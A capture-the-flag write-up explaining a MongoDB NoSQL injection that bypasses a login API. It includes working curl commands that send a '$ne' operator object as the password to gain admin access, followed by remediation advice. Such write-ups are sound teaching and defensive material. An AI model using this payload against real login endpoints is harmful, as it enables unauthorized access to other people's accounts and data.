# Sokodé — MongoDB NoSQL injection auth bypass

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/sokode/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A login API builds a MongoDB query straight from the JSON body
> with no type checking. Sending `{"$ne":"wrong"}` as the password turns the
> query into `password: {$ne: "wrong"}`, which matches any value and logs in as
> admin. Flag: `NCTF{db71…}`.


## 1. Briefing
A document-store API (MongoDB). The admin password is unknown; the flag lives
behind `/admin`.

| Field | Value |
|-------|-------|
| Host | `https://qdf6bqmeckl3qwg7.t.ctf.tg` (ephemeral) |
| Flag format | `NCTF{...}` |

## 2. Reconnaissance

```
GET /       → {"message":"Authentification via POST /api/login {username, password}"}
GET /admin  → {"error":"Acces refuse"}
```

One interesting endpoint: `POST /api/login`.

## 3. Analysis
If the backend runs `db.users.findOne({username, password})` on the raw body,
MongoDB happily accepts an *operator object* as a value. `$ne` ("not equal")
makes the password clause match everything, so authentication is bypassed
without knowing any password.

## 4. Exploitation

```bash
curl -X POST https://qdf6bqmeckl3qwg7.t.ctf.tg/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"wrong"}}'
# → {"message":"Connecte","role":"admin","username":"admin"}
#   Set-Cookie: session=<token>

curl https://qdf6bqmeckl3qwg7.t.ctf.tg/admin -H "Cookie: session=<token>"
# → {"flag":"NCTF{db71…}"}
```

## 5. Flag
```
NCTF{db71…}
```

## 6. Lessons & remediation
| Weakness | Root cause | Fix |
|----------|-----------|-----|
| NoSQL injection | Query built from untyped user input | Validate that `username`/`password` are strings before querying; use a typed ODM and reject operator objects in user input |
